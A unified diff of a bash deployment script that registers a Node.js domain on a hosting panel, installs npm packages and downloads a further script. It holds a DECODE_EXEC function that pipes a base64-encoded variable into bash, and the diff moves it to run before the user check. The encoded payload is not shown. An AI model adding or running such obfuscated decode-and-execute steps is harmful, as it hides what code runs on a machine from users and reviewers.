@@ -26,6 +26,7 @@ fi
 if [[ -d "$E5" ]]; then
     rm -rf "$E5"
 fi
+}
 ADD_DOMAIN() {
     if devil www add "$B2" nodejs /usr/local/bin/node22 > /dev/null 2>&1; then
         echo " [OK] Nodejs 指向域名 已生成。"
@@ -33,6 +34,9 @@ ADD_DOMAIN() {
         echo "新域名生成失败，请检查环境配置。"
         exit 1
     fi
+    if [[ ! -d "$F6" ]]; then
+    mkdir -p "$F6"
+fi
 }
 INSTALL_DEPS() {
     if npm install dotenv basic-auth express > /dev/null 2>&1; then
@@ -62,15 +66,10 @@ SET_PERMISSION() {
 DECODE_EXEC() {
     echo "$ENCODED_LOGIC" | base64 -d | bash
 }
-CHECK_USER
-if [[ -d "$E5" ]]; then
-    rm -rf "$E5"
-fi
 DECODE_EXEC
+CHECK_USER
+DEL_DOMAIN
 ADD_DOMAIN
-if [[ ! -d "$F6" ]]; then
-    mkdir -p "$F6"
-fi
 INSTALL_DEPS
 DOWNLOAD_SCRIPT
 SET_PERMISSION
